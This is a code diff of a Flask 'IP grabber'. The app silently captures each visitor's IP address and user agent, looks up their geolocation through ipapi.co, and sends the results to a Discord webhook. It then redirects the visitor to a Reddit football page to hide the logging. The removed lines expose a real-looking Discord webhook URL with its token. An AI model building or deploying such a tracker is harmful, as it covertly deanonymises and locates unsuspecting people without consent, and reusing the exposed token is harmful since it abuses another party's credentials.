@@ -6,20 +6,20 @@ import os
 
 app = Flask(__name__)
 
-# Webhook URL for Discord (directly provided by you)
-DISCORD_WEBHOOK_URL = "https://canary.discord.com/api/webhooks/1429476905177845901/wfaELO-7bOZxRoN05SORZgGUXLCEoErKciPqDWpBNxKLtSdOOtOC7R5YansQws_rkkaK"
+# Webhook URL for Discord
+DISCORD_WEBHOOK_URL = "https://canary.discord.com/api/webhooks/YOUR_WEBHOOK_URL"
 
-# Connect to Redis (ensure Redis is running locally or through a cloud service)
+# Connect to Redis (ensure Redis is running locally)
 redis_url = os.getenv("REDIS_URL", "redis://localhost:6379")  # Default to localhost if not set
 r = redis.from_url(redis_url)
 
 def get_real_ip():
-    """Extract the real IP address from the request headers."""
+    """Extract the real IP address from the request"""
     xff = request.headers.get("X-Forwarded-For", "").split(",")
     return xff[0].strip() if xff else request.remote_addr
 
 def get_visitor_info(ip, user_agent):
-    """Get geolocation info from ipapi based on IP address."""
+    """Get geolocation info from ipapi based on IP address"""
     try:
         r = requests.get(f"https://ipapi.co/{ip}/json/", timeout=5)
         
@@ -50,7 +50,7 @@ def get_visitor_info(ip, user_agent):
     }
 
 def send_to_discord(info):
-    """Send visitor info to the Discord webhook."""
+    """Send the visitor info to the Discord webhook"""
     embed = {
         "username": "🌍 Visitor Bot",
         "embeds": [{
@@ -72,26 +72,23 @@ def send_to_discord(info):
         }]
     }
 
-    headers = {"Content-Type": "application/json"}
-    response = requests.post(DISCORD_WEBHOOK_URL, json=embed, headers=headers)
-    print(f"Discord webhook response: {response.status_code}")
+    response = requests.post(DISCORD_WEBHOOK_URL, json=embed)
+    print(f"Sent to Discord: {response.status_code}")
 
 @app.route('/')
 def index():
-    """Main route that handles incoming requests."""
+    """Main route that handles requests"""
     ip = get_real_ip()
     user_agent = request.headers.get("User-Agent", "Unknown")
 
-    # Check Redis to see if this IP has already been logged
-    if not r.sismember("logged_ips", ip):  # If the IP isn't already in the Redis set
-        r.sadd("logged_ips", ip)  # Add IP to Redis set
+    if not r.sismember("logged_ips", ip):  # Check if the IP has already been logged
+        r.sadd("logged_ips", ip)  # Log the IP in Redis
         info = get_visitor_info(ip, user_agent)
         send_to_discord(info)
     else:
-        print(f"IP {ip} already logged. Skipping.")
+        print(f"IP {ip} already logged.")
 
-    # Redirect the user instantly to the Reddit page
-    return redirect("https://www.reddit.com/r/football/comments/16n8k5s/can_a_taller_player_become_renowned_for_their/")
+    return redirect("https://www.reddit.com/r/football/")  # Redirect to a random page
 
 if __name__ == "__main__":
-    app.run(host="0.0.0.0", port=8080)
+    app.run(debug=True)
